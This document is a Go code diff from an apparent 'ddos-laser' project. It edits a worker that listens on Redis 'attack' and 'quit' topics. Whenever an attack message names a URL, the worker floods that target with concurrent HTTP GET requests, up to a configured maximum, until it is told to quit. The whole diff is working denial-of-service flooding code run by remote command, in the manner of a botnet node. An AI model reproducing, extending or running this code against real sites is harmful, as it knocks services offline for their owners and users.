@@ -1,10 +1,10 @@
 package main
 
 import (
-	"io/ioutil"
 	"log"
 	"net/http"
 	"sync"
+	"time"
 
 	"github.com/go-redis/redis"
 	"github.com/michaeloverton/ddos-laser/internal/env"
@@ -47,29 +47,69 @@ func main() {
 
 	// Subscribe to the quit topic.
 	quitTopic := subClient.Subscribe("quit")
-	quitChan := quitTopic.Channel()
+	sentinelQuitChan := quitTopic.Channel()
+
+	laserQuitChan := make(chan bool)
 
 	// When a message is received, attack target.
 	for {
 		select {
 		case m := <-attackChan:
-			var wg sync.WaitGroup
-			for i := 0; i < 3000; i++ {
-				go makeRequest(httpClient, m.Payload, &wg)
-			}
-			wg.Wait()
-		case <-quitChan:
+			logrus.Info("new attack on URL: ", m.Payload)
+			go makeRequests(httpClient, m.Payload, env.MaxRequests, laserQuitChan)
+		case <-sentinelQuitChan:
 			logrus.Info("quitting")
+			laserQuitChan <- true
 			return
 		}
 	}
+
+}
+
+func makeRequests(c http.Client, URL string, maxRequests int, quitChan chan bool) {
+	// Current number of requests we have made.
+	requestCount := 0
+
+	for {
+		select {
+		case <-quitChan:
+			logrus.Info("stopping requests")
+			return
+		default:
+			if requestCount < maxRequests {
+				// If we have not maxed  out requests, oncurrently make request to target.
+				go func() {
+					// Create the request to the target.
+					req, err := http.NewRequest("GET", URL, nil)
+					if err != nil {
+						logrus.Errorf("failed to create request: %s", err)
+						return
+					}
+
+					// Make the request.
+					res, err := c.Do(req)
+					if err != nil {
+						logrus.Errorf("request failed: %s", err)
+						return
+					}
+					defer res.Body.Close()
+
+					logrus.Info("status: ", res.StatusCode)
+				}()
+
+				// Increment the number of requests we have made.
+				requestCount++
+			} else {
+				// If we've reached max requests, just chill.
+				logrus.Info("chilling")
+				time.Sleep(5 * time.Second)
+			}
+		}
+	}
+
 }
 
 func makeRequest(c http.Client, URL string, wg *sync.WaitGroup) {
-	//defer wg.Done()
-
-	// Make 100 requests
-	// for i := 0; i < 100; i++ {
 	logrus.Infof("making request to: %s", URL)
 
 	// Create the request to the target.
@@ -87,18 +127,34 @@ func makeRequest(c http.Client, URL string, wg *sync.WaitGroup) {
 	}
 	defer res.Body.Close()
 
-	// Decode the body for now.
-	body, err := ioutil.ReadAll(res.Body)
-	if err != nil {
-		logrus.Errorf("failed to read response body: %s", err)
-		return
-	}
-
-	// Log body.
+	// Log response.
 	logrus.Info("response code:", res.StatusCode)
-	logrus.Info(string(body))
-	// }
 
 	wg.Done()
 
 }
+
+// func makeRequest(c http.Client, URL string, wg *sync.WaitGroup) {
+// 	logrus.Infof("making request to: %s", URL)
+
+// 	// Create the request to the target.
+// 	req, err := http.NewRequest("GET", URL, nil)
+// 	if err != nil {
+// 		logrus.Errorf("failed to create request: %s", err)
+// 		return
+// 	}
+
+// 	// Make the request.
+// 	res, err := c.Do(req)
+// 	if err != nil {
+// 		logrus.Errorf("request failed: %s", err)
+// 		return
+// 	}
+// 	defer res.Body.Close()
+
+// 	// Log response.
+// 	logrus.Info("response code:", res.StatusCode)
+
+// 	wg.Done()
+
+// }
